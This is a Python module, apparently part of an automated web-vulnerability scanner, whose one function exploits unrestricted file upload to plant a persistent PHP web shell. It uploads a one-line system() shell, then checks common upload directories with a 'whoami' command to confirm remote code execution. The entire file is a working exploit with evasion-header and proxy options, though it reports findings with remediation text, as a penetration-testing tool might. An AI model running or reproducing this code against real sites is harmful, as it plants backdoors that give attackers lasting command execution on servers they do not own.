import aiohttp
import asyncio
import os

async def exploit_web_shell(url, param=None, log_callback=None, headers=None, proxy=None):
    """
    Attempts to upload a persistent Web Shell (titan_shell.php) via Unrestricted File Upload.
    """
    findings = []
    
    # Evasion Headers
    final_headers = headers.copy() if headers else {}
    
    # Simple PHP Shell
    shell_content = "<?php system($_GET['c']); ?>"
    shell_name = "titan_shell.php"
    
    # We need to construct a multipart upload usually.
    # But if the finding context has form details, that's complex.
    # For now, we assume standard multipart/form-data upload to the URL.
    
    try:
        data = aiohttp.FormData()
        data.add_field('file', shell_content, filename=shell_name, content_type='application/x-php')
        data.add_field('submit', 'Upload') 
        
        async with aiohttp.ClientSession(headers=final_headers) as session:
            try:
                if log_callback: log_callback(f"   üêö Shell Planter: Attempting to upload {shell_name}...")
                
                async with session.post(url, data=data, timeout=10, ssl=False, proxy=proxy) as resp:
                    text = await resp.text()
                    
                    # Check if upload succeeded
                    if resp.status == 200 and ("uploaded" in text.lower() or "success" in text.lower()):
                         # Try to predict path
                         # Common paths: /uploads/, /files/, /images/, or same dir
                         base_url = url.rsplit('/', 1)[0]
                         paths = [
                             f"{base_url}/{shell_name}",
                             f"{base_url}/uploads/{shell_name}",
                             f"{base_url}/files/{shell_name}",
                             f"{base_url}/images/{shell_name}"
                         ]
                         
                         success_url = None
                         for p in paths:
                             try:
                                 async with session.get(f"{p}?c=whoami", timeout=5, proxy=proxy) as r:
                                     t = await r.text()
                                     if "root" in t or "www-data" in t or "nt authority" in t.lower():
                                         success_url = p
                                         break
                             except: pass
                             
                         if success_url:
                             findings.append({
                                "type": "Remote Code Execution (Web Shell)",
                                "severity": "Critical",
                                "detail": "Successfully uploaded and executed persistent Web Shell.",
                                "evidence": f"Shell URL: {success_url}\nCommand: whoami\nOutput: Confirmed Execution",
                                "remediation": "Restrict file types, rename uploaded files, disable execution in upload dirs."
                            })
            except: pass
    except: pass
    
    return findings
